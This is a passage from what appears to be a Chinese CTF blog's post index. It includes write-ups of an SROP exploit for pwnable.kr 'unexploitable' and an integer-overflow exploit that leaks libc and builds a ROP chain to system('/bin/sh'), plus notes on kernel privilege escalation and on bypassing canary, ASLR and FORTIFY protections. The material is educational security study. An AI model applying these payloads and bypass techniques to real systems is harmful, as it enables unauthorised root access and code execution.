$_TIF_WORK_SYSCALL_ENTRY|_TIF_ALLWORK_MASK, TASK_TI_flags(%r11)\njnz entry_SYSCALL64_slow_path\n```\n\n▲\n\n```\n#注释头\n\nentry_SYSCALL64_slow_path:\n  /* IRQs are off. */\n  SAVE_EXTRA_REGS\n  movq    %rsp, %rdi\n  call    do_syscall_64        /* returns with IRQs disabled */\n```\n\n(2)内核态至用户态：\n\n①swapgs恢复GS\n\n②iretq（加上寄存器信息）或sysretq，如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）\n\nkernel 的 crash 通常会引起重启\n\n \n\n \n\n4.相关保护技术Mitigation：\n\n(1)SMAP和SMEP保护技术：\n\n(arm里面叫PXN(Privilege Execute Never)和PAN(Privileged Access Never))\n\n①SMAP:禁止内核访问用户空间的数据(Supervisor Mode Access Prevention)\n\n②SMEP:禁止内核执行用户空间的代码(Supervisor Mode Execution Prevention)\n\n内核命令行中添加nosmap和nosmep禁用\n\n(2)kernel canary:\n\n编译内核时设置CONFIG_CC_STACKPROTECTOR，可以起到类似于stack canary的技术。\n\n(3)KALSR：内核地址随机化\n\n \n\n \n\n5.提权代码与函数结构体：\n\ncred结构体：kernel用cred结构体记录进程权限(每个结构都有一个cred结构)，保存了进程的相关信息，如果利用这个cred就可以提权。一般调用commit_creds(prepare_kernel_cred(0))完成提权然后用户态“着陆”起shell。\n\n```\n#注释头\n\nstruct cred {\n    atomic_t    usage;\n#ifdef CONFIG_DEBUG_CREDENTIALS\n    atomic_t    subscribers;           /* number of processes subscribed */\n    void        *put_addr;\n    unsigned    magic;\n#define CRED_MAGIC  0x43736564\n#define CRED_MAGIC_DEAD 0x44656144\n#endif\n    kuid_t      uid;                   /* real UID of the task */\n    kgid_t      gid;                   /* real GID of the task */\n    kuid_t      suid;                  /* saved UID of the task */\n    kgid_t      sgid;                  /* saved GID of the task */\n    kuid_t      euid;                  /* effective UID of the task */\n    kgid_t      egid;                  /* effective GID of the task */\n    kuid_t      fsuid;                 /* UID for VFS ops */\n    kgid_t      fsgid;                 /* GID for VFS ops */\n    unsigned    securebits;            /* SUID-less security management */\n    kernel_cap_t    cap_inheritable;   /* caps our children can inherit */\n    kernel_cap_t    cap_permitted;     /* caps we're permitted */\n    kernel_cap_t    cap_effective;     /* caps we can actually use */\n    kernel_cap_t    cap_bset;          /* capability bounding set */\n    kernel_cap_t    cap_ambient;       /* Ambient capability set */\n#ifdef CONFIG_KEYS\n    unsigned char   jit_keyring;       /* default keyring to attach requested\n    /* keys to */\n    struct key __rcu *session_keyring; /* keyring inherited over fork */\n    struct key  *process_keyring;      /* keyring private to this process */\n    struct key  *thread_keyring;       /* keyring private to this thread */\n    struct key  *request_key_auth;     /* assumed request_key authority */\n#endif\n#ifdef CONFIG_SECURITY\n    void        *security;             /* subjective LSM security */\n#endif\n    struct user_struct *user;          /* real user ID subscription */\n    struct user_namespace *user_ns;    /* user_ns the caps and keyrings are relative to. */\n    struct group_info *group_info;     /* supplementary groups for euid/fsgid */\n    struct rcu_head rcu;               /* RCU deletion hook */\n} __randomize_layout;\n```\n\n不同内核版本的cred结构体可能不太一样。\n\n \n\n二、内核态函数及相关变化：\n\n1.printf() -> printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 dmesg 查看效果\n\n2.malloc() -> kmalloc()，内核态的内存分配函数，和malloc()相似，但使用的是slab/slub分配器。\n\n3.free() -> kfree()，同 kmalloc()\n\n4.memcpy() -> copy_from_user()/copy_to_user()\n\n5.copy_from_user() 实现了将用户空间的数据传送到内核空间\n\n6.copy_to_user() 实现了将内核空间的数据传送到用户空间\n\n7.提权相关函数：\n\n```\n#注释头\n\nint commit_creds(struct cred *new)\nstruct cred* prepare_kernel_cred(struct task_struct* daemon)\n```\n\n执行commit_creds(prepare_kernel_cred(0))即可获得 root 权限\n\n函数地址可在/proc/kallsyms，老版本/proc/ksyms中查看(cat|grep)，权限一般需要root\n\n \n\n \n\n三、保护绕过技术：\n\n1.ret2usr:\n\n在没有SMAP/SMEP的情况下把内核指针重定向到用户空间的漏洞利用方式被称为ret2usr\n\n2.ret2dir：\n\n如果用户空间用mmap()把提权代码映射到内存RAM，那么就可以在physmap里找到其对应的副本，就可以修改EIP跳到副本执行，这种利用方式被称为ret2dir。\n\n3.kernel canary:\n\n绕过方法同用户空间的canary绕过大致相同，编译内核时设置CONFIG_CC_STACKPROTECTOR，可以起到类似于stack canary的技术。\n\n \n\n \n\n \n\n \n\n \n","tags":["Kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"pwn中libc版本切换编译","url":"/2021/08/14/pwn中libc版本切换编译/","content":"\n一、手动编译\n\n1.下载对应libc的源码：以2.32为例：glibc-2.32.tar.gz\n\n(1)官网：https://ftp.gnu.org/gnu/glibc/\n\n(2)清华镜像源：https://mirrors.tuna.tsinghua.edu.cn/gnu/glibc/\n\n2.解压，然后新建文件夹来存储编译结果：\n\n```bash\n#注释头\n\ntar -xvf glibc-2.32.tar.gz\nmkdir glibc-2.32_build\nmkdir glibc-2.32_out\n```\n\n3.编译：\n\n```bash\n#注释头\n\ncd glibc-2.32_build\n../glibc-2.32/configure '--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes'\nmake\n```\n\n这里的--prefix=****需要一个绝对路径，不能时相对路径，对于pwn来说就好了，不用再接着往下安装了。不过这是64位的，32位得如下：\n\n```bash\n#注释头\n\ncd glibc-2.32_build\nCC=\"gcc -m32\" CXX=\"g++ -m32\" \\\n../glibc-2.32/configure '--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes --host=i686-linux-gnu --build=i686-lin    ux-gnu' \nmake\n```\n\n基本是差不多的。\n\n4.找libc.so 和 ld.so文件：\n\n(1)libc.so 在glibc-2.32_build目录下\n(2)ld.so 在glibc-2.32_build/elf 目录下\n\n5.使用：\n\n```python\n#注释头\n\np = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n```\n\n这样就可以gdb调试的时候带符号表，然后还有源码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_20-51-09.png)\n\n▲关于ld.so的连接使用，最好还是用编译配套的，不然容易出错。如果不需要源码，只需要按照的libc和ld，就可以make install。然后在glibc-2.32_out/lib/下就能找到这两个文件了。\n\n \n\n二、对应docker下载：\n\n1.搜对应版本libc对应的ubuntu，比如libc-2.27就对应ubuntu18.04，然后pull下来。\n\n2.然后将对应版本的docker源sources.list拷贝进去，然后我这边自己总结了一份安装脚本，一键运行，省去很多麻烦。(记得先备份一下，防止出错)\n\n```bash\ndocker cp sources.list [dockerName]:/etc/apt/\ndocker cp install.sh [dockerName]:/\nchmod a+x install.sh\n./install.sh\n```\n\n装完之后基本的环境就有了，pwndbg，python，pwntools等等，其他的自己慢慢安装吧。\n\n▲有个pwn_docker也挺好使的：\n\n```bash\n#注释头\n\ndocker pull pwn_docker\n```\n\n里面运行也类似不同版本的libc:\n\n```python\n#注释头 \np\np = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './pwn'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n```\n\n \n\n三、工具使用：LibcSearcher\n\n这个算是最常用了，很好用，直接去github上找很多，外面也有很多教程。\n\n \n\n四、patchelf：直接修改ELF文件加载的libc\n\n1.安装：\n\n```bash\n#注释头\n\nsudo apt-get install autoconf automake libtool\ngit clone https://github.com/NixOS/patchelf.git\n./bootstrap.sh\n./configure\nmake\nmake check\nsudo make install\n```\n\n编译环境啥的都要有\n\n2.使用：\n\nhttps://github.com/NixOS/patchelf\n\n```bash\n#注释头\n\npatchelf --set-interpreter /home/hacker/glibc/2.23/64/lib/ld-2.23.so --set-rpath /home/hacker/glibc/2.23/64/lib/ ./pwn\n```\n\n这个可以直接gdb调试，不用再用python打开指定环境。\n\n \n\n五、gdb指定源码级别调试：\n\n▲有时候用Patchelf切换之后，想调试对应版本的glibc源码\n\n1.gdb打开后直接命令输入指定：\n\n```bash\n#注释头\n\ndir /home/hacker/glibc-src/glibc-2.23/malloc\n```\n\n2.gdb环境配置输入：\n\n```bash\n#注释头\n\nvim ~/.gdbinit\ndir /home/hacker/glibc-src/glibc-2.23/malloc\n```\n\n但是这有个问题，如果需要对应版本则没办法，只会加载到最下面的版本，所以一般patchelf之后，指定dir即可。\n\n \n\n \n\n","tags":["libc"],"categories":["PWN"]},{"title":"pwnable.kr-unexploitable","url":"/2021/08/14/pwnable.kr-unexploitable/","content":"\n1.常规checksec，只开启了NX。IDA打开找漏洞，程序很简单，读入数据栈溢出，可以读取1295个字节，但是buf只有0x10h大小，所以可以溢出足够长的数据。\n\n2.程序没有后门，没有导入system函数，没有binsh字符串，也没有write、put、printf之类的可以泄露libc的函数，没办法ROP，然后ROPgadget也搜不到syscall。这里换用另一种工具ropper来搜索：ropper --file=unexploitable --search \"syscall\"，可以搜到一个。有了syscall，可以尝试用rop来给寄存器赋值然后开shell，但是这里还是搜不到给rsi，rdi等寄存器赋值的gadget，这就意味着我们也没办法直接通过ROP实现getshell。\n\n3.如果没有开NX，直接栈劫持然后shellcode就完事了，但是开启了NX，没办法shellcode。\n\n4.啥也不管用的时候，可以用SROP，也就是通过syscall再利用SigreturnFrame来设置寄存器rsi和rid的值，加上字符串binsh可以直接getshell，不用非得设置rsi,rdi寄存器值的rop。但是这里使用SigreturnFrame有限制，需要溢出的长度较长一些，32位下需要依顺序布置栈，64位条件下需要往栈中布置一个结构体，所以需要输入足够长的payload来修改。\n\n5.这里使用的方案是SigreturnFrame，先考虑一段足够长的可修改的内存地址来给我们存放栈劫持的内容。但是在IDA中按ctrl+s查看内存段，发现所有的可改可读的内存段都特别小，没办法存放足够长的溢出内容。这里忽略了一个知识点，临时创建的缓存：也就是我们使用read(0, &buf, 0x50FuLL);时，会临时创建一个长度为0x50F的缓存区间，这个区间足够满足我们的需求，但是在IDA中找不到，那就没办法栈劫持到这个位置。这里可以先动态调试一下，由于没有开启PIE，程序加载后的基地址是固定的，所以无论程序加载多少次，地址仍然不会发生改变。那么转向动态调试，可以看到程序冒出来一个可读可写的内存段：unexploitable，这个就是临时创建的一个缓存区间，长度为F88，足够用来执行操作。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191526527.png)\n\n6.在这个区间上任意选取一个地址来栈劫持，这里选择0x60116c，然后编写payload，尝试能否成功栈劫持并且读入binsh：\n\n```\n#注释头\n\npayload = \"\"\npayload += 'a'*16               #padding\npayload += p64(fake_stack_addr)\n#main函数返回时，将栈劫持到fake_stack_addr处，第一次将使得rbp变为fake_stack_addr, rbp + buf为fake_stack_addr - 0x10\npayload += p64(set_read_addr)   \n#汇编指令为lea rax, [rbp+buf]; mov edx, 50Fh; mov rsi, rax; mov edi, 0; mov eax, 0; call _read的地址处\nio.send(payload)\n```\n\n这样接下来如果再输入binsh字符串，就可以读取到[rbp+buf]处。需要注意的是，这里的set_read_addr是从下图最开始跳转，如果直接跳转call read，那么就会由于read取参是edx,rsi,edi，从而导致数据会存入rsi指向的地址，没办法存到我们劫持的栈中。观察read函数汇编代码可以知道，虽然read存入的地址是rsi，但是rsi是通过rbp+buf来赋值的，所以我们可以通过修改rbp为fake_stack，使得rbp+buf的地址变为fake_stack上的某个地址，再执行下图中的代码，就可以使得read读取的内容直接进入到劫持栈rbp+buf上，也就是fake_stack上。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191526968.png)\n\n7.栈劫持完成之后，考虑第二段的payload，也就是输入binsh字符串和后续内容，来执行SigreturnFrame，使用：\n\n```\n#注释头\n\npayload = \"\"\npayload += \"/bin/sh\\x00\"\n```\n\n输入字符串binsh，存放在fake_stack_addr-0x10处\n\n```\n#注释头\n\npayload += 'a'*8 #padding\npayload += p64(fake_stack_addr+0x10)#存放在0x60116c处\n```\n\n读取完之后，执行leave指令之前的栈底为0x60116c，而leave指令相当于：mov rsp rbp；和pop rbp：\n\n(1)第一条mov rsp rbp之后，0x60116c就被赋值给rsp，也就是rsp指向0x60116c。\n\n(2)第二条pop rbp之后，把0x60116c处的内容赋值给rbp，这里设置0x60116c处的内容为fake_stack_addr+0x10，也就是0x60117c，那么rbp指向0x60117c。rsp下挪一个单位，指向0x60116c+0x08=0x601174。\n\n故leave指令执行完后rsp = 0x601174，rbp = 0x60117c。\n\n▲这里这么设置是有原因的，为了挪动rsp来指向0x601174。\n\n```\n#注释头\n\npayload += p64(call_read_addr)#存放在0x601174\n#存放在0x601174处，为了之后再次调用read修改rax。\n```\n\n接着执行retn指令，相当于pop eip，此时的rsp指向 0x601174，所以我们需要将0x601174处的值变为read_addr的地址，也就是这条语句，这里设置read_addr为0x400571，也就是带有call指令的read。\n\n```\n注释头\n\npayload += p64(fake_stack_addr)#存放在0x60117c，这里可以随便设置，用不到\n```\n\nretn指令之后就是call指令，各种寄存器的值还是没变，所以照常用就行，回来之后rsp仍旧指向0x60117c。此时栈状态为：\n\nrsp = 0x60117c，rbp = 0x60117c。\n\n```\n#注释头\n\npayload += str(frameExecve)#设置SigreturnFrame结构体\n\nio.send(payload)\n#set_read处的读取\n\nsleep(3)\n\n\nio.send('/bin/sh\\x00' + ('a')*7) \n#call_read处的读取。\n```\n\n读取15个字符到0x60115c，目的是利用read返回值为读取的字节数的特性设置rax=0xf，注意不要使/bin/sh\\x00字符串发生改变。\n\n最后io.interactive()即可getshell。\n\n▲总的程序流应该是：首次read->set_read->call_read->syscall\n\n结构体的设置，固定模式：\n\n```\n#注释头\n\nframeExecve = SigreturnFrame() #设置SROP Frame\nframeExecve.rax = constants.SYS_execve\nframeExecve.rdi = binsh_addr\nframeExecve.rsi = 0\nframeExecve.rdx = 0\nframeExecve.rip = syscall_addr\n```\n\n开头设置：\n\n```\n#注释头 \n\nsyscall_addr = 0x400560 \nset_read_addr = 0x40055b \nread_addr = 0x400571 \nfake_stack_addr = 0x60116c \nbinsh_addr = 0x60115c\n```\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"pwn保护措施","url":"/2021/08/14/pwn保护措施/","content":"\n一、RELRO: (ReLocation Read-Only)\n\n1.功能：解决延迟绑定问题，将符号重定向表设置为只读，或者在程序启动时就解析并绑定所有动态符号，防止got表被篡改。\n\n2.表现形式：\n\npwn checksec检查为RELRO: Full RELRO，Partial RELRO保护\n\n3.保护等级：\n\n(1)Partial RELRO:\n\n①一些段(.dynamic、.got等)在初始化后会被标记只读，.got段代表无plt指向的got表，也就是没有发生延迟绑定，没有被外部extern导入的函数被标记为只读。\n\n②但是有被外部extern导入的函数，发生延迟绑定的函数，在.got.plt段，仍然可以篡改got表，这里的got表是.got.plt段。\n\n(2)Full RELRO:直接禁止延迟绑定，无.got.plt段，只有.got段，且被标记为只读，无法修改，无法篡改got表。\n\n4.绕过方法：有啥绕过方法，不改got表不就完了。\n\n \n\n \n\n二、FORTIFY_SOURCE:\n\n1.功能：将敏感函数如read, fgets, memcpy, printf等等添加保护，替换为__read_chk, __fgets_chk, __memcpy_chk, __printf_chk等函数。这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串漏洞的出现。（如直接%7$x）\n\n2.表现形式：带有chk的函数，checksec可以检测到\n\n3.保护等级：\n\n(1)-Ol -D_FORTIFY_SOURCE=0：关闭\n\n(2)-Ol -D_FORTIFY_SOURCE=1：替换get，memecpy等，格式化字符串仍然可用\n\n(3)-Ol -D_FORTIFY_SOURCE=2：格式化字符串也受到限制：\n\n%n，%3$x不可用(跳过了1，2不可用)\n\n%n$只能从1开始才可以：%1$x%2$x可用\n\n4.绕过方法：\n\n(1)利用整数溢出漏洞，篡改_IO_FILE结构中的_IO_FLAGS2_FORTIFY为0，从而关闭FORTIFY_SOURCE对%n的检查。之后再利用任意地址写，将nargs篡改为0，从而关闭对%n$的检查。\n\n具体论文：\n\n[http://phrack.org/issues/67/9.html](http://phrack.org/issues/67/9.html(要挂)\n\nhttps://jackgrence.github.io/phrack-67-9/\n\nhttps://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html\n\n都得挂vpn才能看\n\n \n\n \n\n \n\n三、NX:NX enabled (No execute bit)\n\n1.功能：将内存页以数据和指令两种方式进行了分类。被标记为数据页的内存页（如栈和堆）上的数据无法被当成指令执行，即没有X属性，这样就会导致shellcode失效。除了.text之外，其余段，数据(stack、heap等)都不可执行。\n\n2.表现形式：pwn checksec检查\n\n3.绕过方法：ROP、Onegadget、ret2libc等等\n\n \n\n \n\n \n\n四、ASLR(Address Space Layout Randomization)和PIE(Position Independent Executable)\n\n1.功能：该技术是一个针对堆、栈、libc地址、代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，每次加载程序都会随机化这些地址。\n\n2.表现形式：checksec检查，gdb-peda中输入aslr。\n\n3.不同：\n\n(1)ASLR是系统层面的地址随机，针对栈(stack)，libc加载地址，堆(heap)，没办法在编译时选择是否开启ASLR，不同系统设置下都不一样，只有在程序跑起来，远程调试才能看到随机化。可以在终端输入：\n\ncat /proc/sys/kernel/randomize_va_space\n\n查看当前系统的随机化等级，也可以打开这个文件进行修改等级。共分为3个等级：\n\nA.0：即关闭ASLR\n\nB.1：部分开启，随机化stack和libc加载地址，不随机化heap\n\nC.2：完全开启，随机化stack、libc加载地址、heap\n\n▲注：\n\n由于是系统层面的，做pwn题时肯定是不知道远程的系统环境到底有没有开启ASLR，一般都是默认开启，且都是2等级。做题做到现在没见过哪个题目告诉不开启ASLR的。另外在gdb-peda中查看aslr都是默认为off，因为gdb默认关闭ASLR，可以在gdb-peda中输入aslr on来打开ASLR。\n\n(2)PIE是gcc编译功能时的选项，针对代码段(.text)、初始化数据段(.data)、未初始化数据段(.bss)的防护技术。开启之后，以上提到的都会随机化，同样也是远程调试跑起来才能看到效果。需要注意的是，只有开启了ASLR之后，PIE才能被正常使用。\n\n4.绕过方法：\n\n(1)利用vsyscall或者vdso来滑过一段栈空间，从而将eip挪移到栈底下方我们想要的地址处。\n\n(2)利用栈溢出和打印函数的参数，修改劫持rbp使得利用rbp寻址的打印函数的参数指向栈上其它位置，通过爆破来寻求泄露Libc地址。\n\n(3)利用PIE机制，爆破倒数第四位可以跳转到同一个内存页中的任意函数。\n\n \n\n \n\n \n\n五、Stack Canary/Stack cookies\n\n1.功能：函数退出时，将保存在栈rbp-0x08处的canary和tcbhead_t结构体中的stack_guard来xor操作，若检查到改变则代表执行了栈溢出漏洞，程序调用__stack_chk_fail，打印错误信息，并崩溃。\n\n2.表现形式：\n\n```\n#注释头\n\nmov rax,fs:28h\nmov [rsp+28h+var_20], rax\n------------------------------------------------------\nmov rax, [rsp+28h+var_20]\nxor rax, fs:28h\ncall __stack_chk_fail\n------------------------------------------------------\nv_canary = __readfsqword(0x28u);\nreturn __readfsqword(0x28u) ^ v_canary;\n```\n\n3.不同类型的canary:\n\n(1)Terminator canaries:\n\n最常见的canary，末尾为\\x00，保存在rpb - 0x08的位置。\n\n(2).Random canaries:\n\n在程序初始化时随机生成，保存在一个相对安全的位置。通常由/dev/urandom来生成，有时也使用当前时间的哈希值。\n\n(3).Random XOR canaries:\n\n通过一个随机数和函数栈中所有控制信息，返回地址等异或运算得到的，这样当函数栈中的随机数或与之相关的控制信息，返回地址被修改了，都可以检测到。\n\n2.绕过方法：\n\n(1)有循环时，32或者64位程序下都可以逐字节爆破绕过。\n\n(2)可通过printf字符串漏洞来泄露(%p.%p.%p....)。\n\n(3)通过打印栈上数据的打印函数栈溢出连上canary泄露出来。\n\n(4)当程序读入flag进入内存时，利用函数__stack_chk_fail，加上足够长度的栈溢出覆盖argv[0]为程序中保存flag的地址。这样当__stack_chk_fail运行时就会打印出argv[0]中地址上对应的内容，也就是flag。\n\n(5)由pthread创建出来的线程函数中如果有足够长度的栈溢出，可以直接覆盖canary来源tcbhead_t结构体中的canary和栈中的canary为同一数值，这样检查仍旧通过。\n\n(64位中为fs:[28h]，32位中为gs:[14h])\n\n▲长度一般为rbp+2000左右，不同的Libc版本都不太一样，需要调试才能知道。原因是通过pthread出来的线程函数栈会被安置到与TLS相差约2000字节的距离处：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519177.png)    ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519553.png)\n\n这里可以看到，第一个是main函数栈，第二个是在main函数中通过pthread进程创建并且调用的函数栈，两者相差将近0x700000000这么远，完全不是正常的函数调用相差的栈距离。同时在该函数中rbp指向的始终是0000(全是)，该函数结束后会先跳转到libc中的libpthread来恢复栈。\n\n▲64位的tcbhead_t结构体：\n\n```\n#注释头\n\ntypedef struct\n{\n  void *tcb;        /* Pointer to the TCB.  Not necessarily the\n               thread descriptor used by libpthread.  */\n  dtv_t *dtv;\n  void *self;       /* Pointer to the thread descriptor.  */\n  int multiple_threads;\n  int gscope_flag;\n  uintptr_t sysinfo;\n  uintptr_t stack_guard;//即为canary，fs:28h处\n  uintptr_t pointer_guard;\n  ...\n} tcbhead_t;\n```\n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN","pwn-Knowledge"]},{"title":"pwn堆-IDA-0x01","url":"/2021/08/14/pwn堆-IDA-0x01/","content":"\n▲堆题一般都需要设置下IDA中的结构体：\n\n1.结构体设置：打开IDA-窗口-结构体(alt+4)。\n\n2.编辑-添加结构体类型，然后写名称(insert)。\n\n3.出现新增的struct之后，将鼠标放在该结构体ends位置，按d添加成员。\n\n4.将鼠标放在成员上，按d轮转设置成员大小，按u可删除成员。\n\n5.找到malloc的位置，判断好哪个变量是存放chunk和chunk_size，之后按y将其设置为:\n\nstruct struct_Name *array_Name[count]\n\n(一般都是这样的，题目会创建一个数组，每个元素是一个结构体，结构体里有两个数据成员，为chunk和chunk_size，这里的chunk就是Malloc返回的指针。不同题目具体分析，有的也有函数指针的数据成员void * fun_Name())\n\n6.设置增删改查函数的变量类型为void，不然if函数就有的难受了。\n\n7.将判断的成员变量什么的都设置好，按N改名，之后再来分析漏洞，不然很容易混淆。\n\n参考资料：\n\nhttps://blog.csdn.net/hgy413/category_1151311.html\n","tags":["IDA"],"categories":["PWN","pwn堆-IDA"]},{"title":"shadow-IntergerOverflow-Nice","url":"/2021/08/14/shadow-IntergerOverflow-Nice/","content":"\n1.常规checksec，开了NX，FULL RELRO，Canary，没办法shellcode，修改got表。然后IDA打开找漏洞：\n\n(1)整数转换漏洞：\n\n输入message_length之后将长度返回进行atoi，将atoi的返回值给到下一个输入message的getline。中间用atoi进行了一个字符串转int的操作，而atoi是一个将数字型字符串转成数字的函数，”-1”可以转换为-1。但是getline中read的长度参数是size_t，相当于是unsigned int，是一个无符号数。\n\n▲而int的表达方式是：0~2147483647(0~0x7fffffff)  -2147483648~-1(0x80000000~0xffffffff)\n\nunsigned的表达方式是：0~4294967295(0~0xffffffff)\n\n那么int的-1转换成unsigned之后就会变成0xffffffff，从而溢出。\n\n▲由于程序实现了自定义的pop，push，ret，call等几个控制栈帧的汇编代码，所以这里的漏洞不太好找，汇编不太好的只能先慢慢调试验证猜想是否正确。\n\n(2)栈溢出：栈溢出是从整数转换漏洞中来的，由于message是保存在message函数栈上的，所以就如果将read的长度参数变得很大，就可以栈溢出。\n\n▲这里的栈溢出和平常栈溢出有点不同，而且还开了canary，照理说这个栈溢出没什么用，但是这里的Message是一个循环，只要message函数不退出，那么就不会触发canary的检查，就算栈溢出了，那也得等到message函数退出程序才会崩溃。\n\n2.现在只有两个漏洞，但是看程序F5大法啥也看不出来，看汇编吧：\n\n(1)输入name的call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528530.jpeg)\n\n(2)输入长度的call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528677.jpeg)\n\n(3)输入message的call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528431.jpeg)\n\n可以看到，输入message和name的getline中保存数据的参数不一样，\n\n保存name的参数是：[ebp+arg_0]\n\n保存message的参数是：[ebp+var-2c]\n\n再看一下这两个参数的定义：\n\narg_0 = dword ptr  8\n\nvar_2C = byte ptr -2Ch\n\n可以看到name保存在ebp的下方，不在message的函数栈，但是message保存在ebp上方，在message函数栈中。\n\n3.那么现在思考下攻击思路。先输入-1执行栈溢出漏洞，将message函数栈下方的保存name的内容更改为某函数的got表，这样在打印name时就可以将该函数打印出来。\n\n(这里能打印的原因是printf的传参关系，这里能看到，name和message传参所用指令不同：![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528201.jpeg)\n\nname是mov指令，是直接将ebp+arg_0上的内容传给eax\n\nmessage是lea指令，是将ebp+var_2c这个栈地址传给edx\n\n那么显而易见，ebp+arg_0上保存的肯定是一个栈地址，这个栈地址上的内容才是name的真实内容。所以如果我们覆盖ebp+arg_0上的内容为got表，那么再打印就是取got表中的内容打印，也是函数真实地址。)\n\n从而泄露出libc基地址。之后再执行栈溢出，覆盖返回地址为ROP链来getshell。但是这里有一个问题，由于程序自定了某些汇编函数，并且在调试过程中发现用程序的call来调用的函数，返回地址不再是原来call函数的下一句代码，而是一个restore_eip函数。因为在leave和ret指令执行前，执行了call ret，修改了某些东西，导致原本ebp下面不再是函数的返回地址了。并且由于是传指针，就算栈溢出，溢出的也只能是message函数栈，那有canary的情况下，溢出也没有什么意义。但是其它函数返回地址则是直接跳转到ret_stub函数，而这个ret_stub函数是保存在栈上的。\n\n4.这里就想到printf函数，由于name会被打印出来，并且调试可以发现，将name总共16字节顶满后会连上一个17F79D79，之后是两个retn的地址，再之后就是一个栈地址，这几个数据都没有\\x00结束字符，所以可以被printf连在一起打印出来：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528071.jpeg)\n\n那么可以考虑将name顶满后连上ebp泄露出栈地址，之后找到保存read返回地址的栈地址，将写入name的栈地址更改为保存read返回地址的栈地址。之后我们再往name中写东西，就相当于覆盖read函数的返回地址。再经过反复调试，发现read函数返回地址取用的地方刚好是FFF25c3c-0x100，而且每次都是那个地址，那么就可以覆盖了。(这里利用输入message连上ebp也可以泄露出message的ebp上保存的内容，也是相同的栈地址，调试出来的)\n\n5.现在就尝试编写exp:\n\n(1)首先三个函数：\n\n```\n#注释头\n\ndef setName(name):\nio.sendafter('Input name :',name)\n\ndef setMessage(message):\nio.sendlineafter('Message length :','-1')\nio.sendafter('Input message :',message)\n\ndef changeName(c):\nio.sendlineafter('Change name?',c)\n```\n\n(2)通过填满name，泄露一个栈地址：\n\n```\n#注释头\n\nsetName('A'*0x10)\nsetMessage('BBBBBBBBBB')\nsh.recvuntil('<')\nsh.recv(0x1C)\nstack_addr = u32(sh.recv(4))\nchangeName('n')\nlog.info(\"stack_addr:%x\"%stack_addr)\n```\n\n(3)泄露函数真实地址：\n\n```\n#注释头\n\npayload = 'a'*0x34 + p32(atoi_got) + p32(0x100) + p32(0x100)\n#这里第一个p32(0x100)是覆盖getline的读取长度，也就是arg_4，第二个是为了覆盖循环次数，也就是arg_8\nsetMessage(payload)\nsh.recvuntil('<')\natoi_addr = u32(sh.recv(4))\nlog.info(\"atoi_addr:%x\"%atoi_addr)\n```\n\n获取name的长度：当然这改掉的是name的长度，message的长度保存在[ebp+var_30]上，并且因为-1已经被更改为0xffffffff，足够大了。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191529313.jpeg)\n\n判断循环次数：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528168.jpeg)\n\n(4)计算得到libc中其它地址：\n\n```\n#注释头\n\nlibc = LibcSearcher('atoi',atoi_addr)\nlibc_base = atoi_addr - libc.dump('atoi')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\n```\n\n(5)将写入name的地方覆盖成读取read函数返回地址的地方：\n\n```\n#注释头\n\npayload = 'a'*0x34 + p32(target_addr)\nsetMessage(payload)\n```\n\n(6)再次读取name的时候就可以发送rop链：\n\n```\n#注释头\n\nrop = p32(system_addr) + p32(0) + p32(binsh_addr)\nsetName(rop)\n```\n\n(7)最后getshell:\n\n▲这个exp在不同的glibc版本下不太一样，2.23/2.24/2.27都能跑通，但是在2.31/2.32版本下没办法跑通，尤其是2.31，连栈地址都没办法泄露。2.32则是在最后一步会失败，不知道为什么。可能是canary的原因，不同版本的canary检查机制好像不一样。\n","tags":["整数漏洞"],"categories":["PWN","整数漏洞0xb"]},{"title":"qemu逃逸-pwn解题","url":"/2021/08/14/qemu逃逸-pwn解题/","content":"\n一、内存模块：![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507619.jpeg)\n\n1.可以看到在实际物理内存physical memory中存在qemu进程的内存空间\n\n2.之后在qemu进程的内存空间中虚拟化出虚拟主机的实际内存空间Guest's phy memory。\n\n3.然后才是虚拟主机中各个进程的内存分配。\n\n▲这里可以看到虚拟机中的进程地址都在实际内存地址中有映射，所以如果我们可以找到在虚拟主机中的某个进程对应的实际内存地址，那么一旦满足一定权限要求就可以执行实际内存中qemu进程加载的libc中的内容，从而调用实际内存中的system命令，实现qemu逃逸。\n\n 